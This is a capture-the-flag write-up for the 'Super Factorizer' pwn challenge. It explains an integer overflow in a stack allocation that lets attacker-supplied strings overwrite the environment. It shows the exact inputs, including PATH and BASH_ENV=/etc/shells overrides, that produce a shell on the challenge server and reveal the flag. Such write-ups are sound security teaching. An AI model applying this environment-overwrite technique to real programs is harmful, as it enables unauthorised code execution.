# Super Factorizer

This quite original challenge was supposed to be of "Medium" dificulty (two stars out of three), but got only 4 solves at the time this write-up was written.
TLDR: unchecked dynamic allocation on stack, overwrite environement variables used by a bash script, get code execution thanks to the `BASH_ENV` variable.

## Reconaissance

We are given a [binary](./super-factorizer), its [source code](./super-factorizer.c), the [libc](./libc-2.36.so) and [ld](./ld-2.36.so) it runs with on the server, and a [shell script](./factor.sh) the binary is calling. First of all, we'll patch the binary to make it run in an environment that is as close as possible to the server one:
```
cp super-factorizer patched
patchelf --set-interpreter ./ld-2.36.so patched
patchelf --set-rpath ./ patched
ln -s libc-2.36.so libc.so.6
chmod u+x ld-2.36.so
chmod u+x patched
```
We can now run it:
```
$ ./patched
[ SuperFactorizer ]

Size of list> 4
nums[1]: 42
nums[2]: 1337
nums[3]: 13
nums[4]: 37


42: 2 3 7
1337: 7 191
13: 13
37: 37
```
It is factorizing numbers... Let's have a look at the [source code](./super-factorizer.c). The interesting part is obviously the `factorize` function, which takes as argument (`count`) an unigned 64 bits number (`size_t`). This number has been given by the user in `main`, but as a positive **signed** 64 bits number (`ssize_t`). So, `count` must be between `1` and `2**63-1`. The `factorize` functions dynamically allocates a buffer of `count + 2` pointer to `char` on the stack, which will contain the `argv` passed to the `factor.sh` script, then prompts the user for `count` strings, which will be inserted in this array. This array is then given to `execv` in order to run the script with the provided arguments.

What does the [shell script](./factor.sh) do? It contains only one line of command:
```
exec timeout 1 factor -- "$@"
```
It just executes the coreutils [`factor`](https://www.gnu.org/software/coreutils/manual/html_node/factor-invocation.html) command, with a given timeout and with the provided numbers as arguments, properly quoted. We can notice that the `timeout` and `factor` commands are not called by their full path, which is quite a bad practice, we'll come to this later.

One interesting thing with this script is that it is called with `bash`, which as many more features than `sh`. The arguments should be properly quoted, but just in case, let's try out some classical bash injections. We can add `set -x` to the script to print the command before running it:
```
$ ./patched
[ SuperFactorizer ]

Size of list> 1
nums[1]: $(id)


+ exec timeout 1 factor -- '$(id)'
factor: ‘$(id)’ is not a valid positive integer
$ ./patched
[ SuperFactorizer ]

Size of list> 1
nums[1]: '$(id)' 


+ exec timeout 1 factor -- ''\''$(id)'\'''
factor: ‘'$(id)'’ is not a valid positive integer
```
Of course, it does not work. It would not be a pwn challenge if you could solve it without memory corruption.

## The vulnerability

The vulnerability is quite easy to spot: dynamic stack based allocation is always a bad idea. Here for example, we allocated `count + 2` pointers, so we need a total of `(count + 2)*8` bytes, so if we provide `2**63 - 1` as input, we need to allocate `4*2**64 + 8` bytes on the stack. That is surely impossible and should crash, since the virtual memory space is only `2**64` bytes, right?
```
$ ./patched
[ SuperFactorizer ]

Size of list> 9223372036854775807
nums[1]: 42
nums[2]: 56


42: 2 3 7
56: 2 2 2 7
```
![Anakin](./Anakin.png)

We try a few other numbers, and find out that `2**63-4`, for example, triggers a segfault. What is going on? Let's have a lok at the assembly code responsible for this stack allocation.We can get it with `objdump`, or with a dissasembler, like `iaito`:
```asm
//prologue
0x000011ce      push rbp
0x000011cf      mov rbp, rsp
0x000011d2      push rbx
0x000011d3      sub rsp, 0x48
//argument of the function
0x000011d7      mov qword [var_48h], rdi
//save the current value of rsp in rbx, so that we can restore it at the end of the function
0x000011db      mov rax, rsp
0x000011de      mov rbx, rax
//count + 2
0x000011e1      mov rax, qword [var_48h]
0x000011e5      add rax, 2
[...] //cut out not relevant code
//(count + 2)*sizeof(char *)
0x00001206      lea rdx, [rax*8]
//seems complicated, but it is just rounding the value to the nearest multiple of 0x10
0x0000120e      mov eax, 0x10
0x00001213      sub rax, 1
0x00001217      add rax, rdx
0x0000121a      mov esi, 0x10
0x0000121f      mov edx, 0
0x00001224      div rsi
0x00001227      imul rax, rax, 0x10
//substract the result from the current stack pointer
0x0000122b      sub rsp, rax
```
So, what happens is that the computation of the required sized in the `rdx` register at address `0x1206` will overflow, and the result will later simply be substracted from `rsp`. So, we can substract arbitray values from `rsp`, positive or negative, as long as they are multiples of `0x10` . We can thus make this array be only of a very small size, while we are still allowed to write many entries to it, or even let the array have a negative size and start further down the stack. Looks like a good old stack-based buffer overflow, so it should not be too difficult, right?

![wellyes](./WellYes.png)

## Failed exploitation attempts

We can't write arbitray values to the stack, but only pointers to strings allocated on the heap. And, the first of these strings will always be "./factor.sh". I did some drawings on the stack on paper with the help of iaito and GDB and tried to figure out if I could overwrite something interesting. Here is a restitution of this drawing, where lowest addresses are on top:
|Address | Content |
|--------|---------|
|rbp-0x50| padding|
|rbp-0x48| count|
|rbp-0x40|n|
|rbp-0x38|idx|
|rbp-0x30|pointer to argv|
|rbp-0x28| count + 1, not used|
|rbp-0x20|r|
|rbp-0x18|i|
|rbp-0x10|padding|
|rbp-0x8|saved rbx
|rbp|saved rbp|
|rbp++0x8|return addresss|

If we remember that we can only make our argv start at a multiple of 0x10, here is what happens with the different possible targets:
- `rbp-0x50` or before: when we reach `rbp-0x50`, line 42 (`args[idx+1] = NULL`) sets `count` to 0, and we can't overwrite further
- `rbp-0x40`: at the first prompted argument, line 42 sets `pointer to argv` to NULL, and the `getline` call causes a segfault
- `rbp-0x30`: `pointer to argv` is overwritten with the address of the "./factor.sh" string, which is of course not a pointer array, so the `getline` call causes a segfault
- `rbp-0x20` or after: the call stack of `printf` or `getline` overwrites important local variables of `factorize`, such as `count` or `pointer to argv`

## Targeting the environment

We can however go deeper down the stack, and overwrite the environment. Since the environment is an array of pointers to chars, that would fit well with what we can write. And since the environment is further away from the stack frame of `factorize`, we can hope that the calls to `printf` or `getline` won't destroy our stack frame. But which environment variables should we target? The most obvious one would be the `PATH` variable, which references the locations where executables can be found. Let's try to overwrite it. To do this, I looked in GDB at the offset between `rbp-0x50` in the main stack frame and the beginning of the environmnet. We will just overwrite the first variable with "PATH=/fake" and nuke the rest of the environment:
```
$ ./patched
[ SuperFactorizer ]

Size of list> 9223372036854775755
nums[1]: PATH=/fake
nums[2]: 


./factor.sh: line 19: exec: timeout: not found
```
It works, the script can not find the `timeout` program anymore! This would be already a win in a local context, because we could simply put our own binary named "timeout" in a random folder and set this folder as path, but here we can't create files or directories. Let's see if there are other interesting environment variables we could use. I remembered hearing about a variable calle `IFS`, which defines which characters should be considered as separators, and was often used in exploits, but it seems like it has been patched long ago, `bash` [does not take it](https://github.com/bminor/bash/blob/f3b6bd19457e260b65d11f2712ec3da56cef463f/variables.c#L588) from the environment anymore when running a script.

Did I say `bash`? Let's have a look at some environment variables that are specific to bash. I found [this article](
https://www.shell-tips.com/bash/environment-variables/) which listed a whole bunch of variables, and went through them until I found an interesting one:
> The $BASH_ENV environment variable is used by Bash to define an init file to read before executing a script.

So, we can specifiy a path of a script that will be run by bash before our script, seems interesting! We would then just need a file that is already present on the server, is a valid bash script (at least at the beginning) and contains interesting commands for us. For example, a file that contains shell names. This file does exist, it is `/etc/shells`:
```
$ cat /etc/shells
# Pathnames of valid login shells.
# See shells(5) for details.

/bin/sh
/bin/bash
/bin/zsh
/usr/bin/zsh
/usr/bin/git-shell
/bin/rbash
/usr/bin/rbash
/usr/bin/bash
/usr/bin/sh
```
Let's try it out locally:
```
$ ./patched
[ SuperFactorizer ]

Size of list> 9223372036854775755
nums[1]: BASH_ENV=/etc/shells
nums[2]: 


sh-5.2$
```
It works! Now we just need to run it against the remote, and we get our flag!
```
$ nc challenges.france-cybersecurity-challenge.fr 2105
[ SuperFactorizer ]

Size of list> 9223372036854775755
nums[1]: BASH_ENV=/etc/shells
nums[2]: 


id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls  
factor.sh
flag.txt
super-factorizer
cat flag.txt
FCSC{0f531ad9168d64c1d520a82593a2d968fce8478e5a6d1a310ea5531a6724dc3e}
```
